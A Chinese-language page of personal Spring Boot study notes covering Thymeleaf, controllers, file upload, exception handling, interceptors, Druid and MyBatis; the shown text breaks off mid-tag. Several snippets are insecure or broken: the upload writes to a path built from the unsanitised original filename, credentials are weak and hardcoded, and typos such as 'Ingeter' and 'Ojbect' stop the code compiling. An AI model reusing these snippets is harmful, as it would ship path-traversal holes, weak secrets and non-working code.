<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@MapperScan(&quot;com...mapper&quot;)</span></span><br></pre></td></tr></table></figure>


<h2 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h2><p>静态资源目录</p>
<ul>
<li>&#x2F;resources&#x2F;</li>
<li>&#x2F;static&#x2F;</li>
<li>&#x2F;public&#x2F;</li>
<li>&#x2F;</li>
</ul>
<p>Webjars 不用</p>
<ul>
<li><code>localhost/webjars/</code></li>
</ul>
<p>也可以通过配置文件修改位置。</p>
<p>首页位置放在静态资源文件夹下，名称为<code>index.html</code>。</p>
<p><code>templates</code>目录下的文件只能使用<code>Controller</code>调用。</p>
<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><h3 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h3><p>导入包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-thymeleaf</span><br></pre></td></tr></table></figure>

<p>在模板中加入命名空间</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>基本用法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>[[ $&#123;msg&#125; ]]<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Controller 引用模板</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/student&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;home-template&quot;</span>;  <span class="comment">// return 模板名称</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以给公共部分传参数。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 子页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">&quot;~&#123;commons/commons::sidebar(active=&#x27;main.html&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 公共页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:class</span>=<span class="string">&quot;$&#123;active==&#x27;main.html&#x27;?&#x27;active&#x27;:&#x27;&#x27;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">thymeleaf:</span></span><br><span class="line">    <span class="attr">cache:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="Freemarker"><a href="#Freemarker" class="headerlink" title="Freemarker"></a>Freemarker</h3><p>无</p>
<h2 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h2><p>返回<code>Json</code>或字符串的控制器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/first&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">First</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回模板的控制器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接收表单参数的控制器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(&quot;username&quot;)</span> String user, </span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(&quot;password&quot;)</span> String pwd, </span></span><br><span class="line"><span class="params">        Model model)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;right&quot;</span>.equals(pwd))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/success.html&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>允许的传参方式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PathVariable</span></span><br><span class="line"><span class="meta">@RequestHeader</span></span><br><span class="line"><span class="meta">@RequestBody</span></span><br><span class="line"><span class="meta">@RequestParam</span></span><br><span class="line"><span class="meta">@CookieValue</span></span><br><span class="line"><span class="meta">@ModelAttribute</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/car/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getCar</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@PathVariable(&quot;id&quot;)</span> Ingeter id,</span></span><br><span class="line"><span class="params">    	<span class="meta">@PathVariable</span> Map&lt;String, String&gt; variables,</span></span><br><span class="line"><span class="params">    	<span class="meta">@RequestHeader</span> Map&lt;String, String&gt; headers, // 或 MultiValueMap / HttpHeaders</span></span><br><span class="line"><span class="params">    	<span class="meta">@RequestParam(&quot;age&quot;)</span> Ingeter age,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam</span> Map&lt;String, String&gt; params, </span></span><br><span class="line"><span class="params">        <span class="meta">@CookieValue(&quot;_ga&quot;)</span> String _ga, </span></span><br><span class="line"><span class="params">        <span class="meta">@RequestBody</span>)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, id);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@PostMapping(&quot;/car/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">postCar</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@PathVariable(&quot;id&quot;)</span> Ingeter id,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestBody</span> String content)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, id);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>控制器的增删改查</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    StudentService studentService; </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/student&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">list</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">        <span class="comment">// 渲染前端</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;student/list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/student/add-&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">add</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">        <span class="comment">// 渲染前端</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;student/add&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/student/add-&#123;id&#125;&quot;)</span>  <span class="comment">// 上传的表单字段必须与类的属性一致</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doAdd</span><span class="params">(Student student)</span> &#123;</span><br><span class="line">        studentDao.save(student);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/student&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/student/update-&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">update</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id, Model model)</span> &#123;</span><br><span class="line">        <span class="comment">// 渲染前端</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;student/update&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/student/update-&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpdate</span><span class="params">(Student student)</span> &#123;</span><br><span class="line">        studentDao.update(student);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/student&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/student/del-&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doDelete</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">        studentDao.delete(id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/student&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="comment">// 不走视图解析器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件上传</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/student/upload&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">upload</span><span class="params">(<span class="meta">@RequestPart(&quot;image&quot;)</span> MultipartFile image)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span>(!image.isEmpty()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> image.getOriginalFilename();</span><br><span class="line">            <span class="comment">// 原生方法</span></span><br><span class="line">            image.getInputStream();</span><br><span class="line">            <span class="comment">// 传输到其他位置</span></span><br><span class="line">            image.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/uploads/image/&quot;</span> + filename));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件上传，还要配置文件大小限制</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">servlet:</span> </span><br><span class="line">    <span class="attr">multipart:</span></span><br><span class="line">      <span class="attr">max-file-size:</span> <span class="string">10MB</span></span><br><span class="line">      <span class="attr">max-request-size:</span> <span class="string">100MB</span></span><br></pre></td></tr></table></figure>

<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>默认情况下，SpringBoot会转发到<code>/error</code>处理错误。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">error:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/error</span></span><br></pre></td></tr></table></figure>

<p>如果要自定义错误页面，则只要在<code>public/error</code>，<code>template/error</code>创建相应文件<code>4xx.html</code>，<code>5xx.html</code></p>
<p>也可以编写<code>ControllerAdvice</code>，传输一些参数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler(&#123;ArithmeticException.class, NullPointerException.class&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleArithException</span><span class="params">(Exception e)</span> &#123;</span><br><span class="line">        log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;  <span class="comment">// 视图地址</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以自定义异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ResponseStatus(value=HttpStatus.FORBIDDEN, reason=&quot;xxxx&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 某处抛出异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MyException</span>(<span class="string">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>一些其他的异常处理，例如传参异常，不支持的媒体异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Order(value=)</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerHandlerExceptionResolver</span> <span class="keyword">implements</span> <span class="title class_">HandlerExceptionResolver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">resolveException</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                        HttpServletResponse response,</span></span><br><span class="line"><span class="params">                                        Ojbect handler,</span></span><br><span class="line"><span class="params">                                        Exception ex)</span></span><br><span class="line">        response.sendError(<span class="number">400</span>, <span class="string">&quot;msg&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="配置类"><a href="#配置类" class="headerlink" title="配置类"></a>配置类</h2><p>例如配置拦截器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainMvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="comment">// 重写WebMvcConfigurer方法，覆盖SpringMVC配置</span></span><br><span class="line">    <span class="comment">// 路由控制</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> &#123;</span><br><span class="line">        WebMvcConfigurer.<span class="built_in">super</span>.addViewControllers(registry);</span><br><span class="line">        registry.addViewController(<span class="string">&quot;/&quot;</span>).setViewName(<span class="string">&quot;/index&quot;</span>);</span><br><span class="line">        registry.addViewController(<span class="string">&quot;/index.html&quot;</span>).setViewName(<span class="string">&quot;/index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 登录拦截器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        WebMvcConfigurer.<span class="built_in">super</span>.addInterceptors(registry);</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">LoginInterceptor</span>()).addPathPatterns(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/index**&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>底层使用<code>Spring Data</code>连接各种数据库。首先导入数据包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql-connector-java</span><br><span class="line">spring-boot-starter-data-jdbc</span><br></pre></td></tr></table></figure>

<p>修改配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span>  <span class="comment"># Bean 与 Spring 绑定</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;jdbc:mysql://localhost:3306/study?useUnicode=true&amp;characterEncoding=utf-8mb&quot;</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span><br></pre></td></tr></table></figure>


<p>测试数据库连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> DataSource dataSource;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testDataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    System.out.println(dataSource.getClass());</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用JDBC方法的控制器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/info&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InfoController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jdbc&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Map&lt;String, Object&gt;&gt; <span class="title function_">jdbc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.queryForList(sql);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="整合Druid"><a href="#整合Druid" class="headerlink" title="整合Druid"></a>整合Druid</h2><p>整合<code>Druid - Alibaba</code>数据源。导入依赖包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">druid</span><br><span class="line">log4j</span><br></pre></td></tr></table></figure>

<p>修改配置参数</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span> </span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;jdbc:mysql://localhost:3306/study?useUnicode=true&amp;characterEncoding=utf-8mb&quot;</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>  <span class="comment"># 新增</span></span><br></pre></td></tr></table></figure>

<p>特性：使用配置类配置管理页面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DruidConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix = &quot;spring.datasource&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">druidDataSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加监控页面</span></span><br><span class="line">    <span class="meta">@Bean</span>  <span class="comment">// 此方法用于替代 web.xml 使用</span></span><br><span class="line">    <span class="keyword">public</span> ServletRegistrationBean <span class="title function_">statViewServlet</span><span class="params">()</span> &#123;</span><br><span class="line">        ServletRegistrationBean&lt;StatViewServlet&gt; bean =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>&lt;StatViewServlet&gt;(<span class="keyword">new</span> <span class="title class_">StatViewServlet</span>(),<span class="string">&quot;/druid/*&quot;</span>);</span><br><span class="line">        <span class="comment">// 登录用户名与密码</span></span><br><span class="line">        HashMap&lt;String, String&gt; initParameters = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        initParameters.put(<span class="string">&quot;loginUsername&quot;</span>, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        initParameters.put(<span class="string">&quot;loginPassword&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        initParameters.put(<span class="string">&quot;allow&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        bean.setInitParameters(initParameters);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="整合MyBatis"><a href="#整合MyBatis" class="headerlink" title="整合MyBatis"></a>整合MyBatis</h2><p>整合<code>Mybatis</code>。导入包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mybatis-spring-boot-starter</span><br></pre></td></tr></table></figure>

<p>修改配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span> </span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;jdbc:mysql://localhost:3306/study?useUnicode=true&amp;character_set_server=utf-8mb4&amp;serverTimezone=Asia/Shanghai&quot;</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">&quot;com.example.demox.pojo&quot;</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">&quot;classpath:mybatis/mapper/**/*.xml&quot;</span></span><br></pre></td></tr></table></figure>

<p>编写Mapper</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">    List&lt;Student&gt; <span class="title function_">listStudents</span><span class="params">()</span>;</span><br><span class="line">    Student <span class="title function_">listStudentById</span><span class="params">(Integer id)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">addStudent</span><span class="params">(Student student)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">updateStudent</span><span class="params">(Student student)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">deleteStudent</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.demox.mapper.StudentMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;StudentResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.example.demox.pojo.Student&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;listStudents&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;StudentResultMap&quot;</span>&gt;</span></span><br><span class="line">        select id, name, age from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--其他例子--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getAccountById&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Account&quot;</span>&gt;</span></span><br><span class="line">        select * from study.account where _id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;addAccount&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;Account&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">        insert into study.account (username, password)</span><br><span class="line">        values (#&#123;username&#125;, #&#123;password&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span 